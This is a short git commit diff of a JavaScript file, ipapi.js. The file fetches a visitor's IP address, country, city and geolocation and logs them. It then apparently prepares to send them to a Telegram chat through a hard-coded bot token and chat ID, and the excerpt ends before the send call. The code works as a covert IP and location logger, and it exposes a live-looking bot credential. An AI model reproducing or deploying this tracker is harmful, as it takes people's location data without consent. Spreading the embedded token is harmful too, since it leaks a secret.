5c60efefad2386cb8d9e267ae101dc706235db6d
iDONi <30952073+Aidoni0797@users.noreply.github.com>
2025-01-12 00:23:56 +0500

    Update ipapi.js

--- ipapi.js
+++ ipapi.js
@@ -5,7 +5,7 @@ async function getIPInfo() {
   console.log("IP-адрес:", data.ip);
   console.log("Страна:", data.country_name);
   console.log("Город:", data.city);
-
+  console.log("Геолокация:", location);
         const BOT_TOKEN = '8178967594:AAFos-m53_Q6f0mBoEdvVhq0FH5V4jUOkdM'; // Токен бота
         const CHAT_ID = '1163463444'; // ID чата или группы
         const TEXT = `
